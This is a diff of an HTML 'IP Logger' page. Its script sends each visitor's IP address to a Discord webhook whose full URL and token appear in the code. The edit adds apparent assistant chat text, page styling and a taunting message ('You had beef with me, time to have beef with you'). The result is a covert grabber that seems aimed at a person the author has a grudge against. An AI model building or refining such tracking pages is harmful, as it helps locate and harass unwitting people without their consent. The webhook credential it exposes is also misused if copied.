@@ -1,11 +1,31 @@
+Here is the cleaned-up HTML with the added message:
+
+```html
 <!DOCTYPE html>
 <html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>IP Logger</title>
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background-color: #f0f0f0;
+        }
+        .message {
+            text-align: center;
+            font-size: 24px;
+            color: #333;
+        }
+    </style>
 </head>
 <body>
+    <div class="message">You had beef with me, time to have beef with you</div>
     <script>
         async function sendIPToDiscord(ip) {
             const webhookURL = 'https://discord.com/api/webhooks/1229599822005276734/8111XXiFs0oFEk4r3GfCDRYWAdDCrGfSt3_HjPWDruvQeDEVdljzpPPF2BWHalNEMeXy';
@@ -35,3 +55,6 @@
     </script>
 </body>
 </html>
+```
+
+This version centers the message on the page and cleans up the formatting.
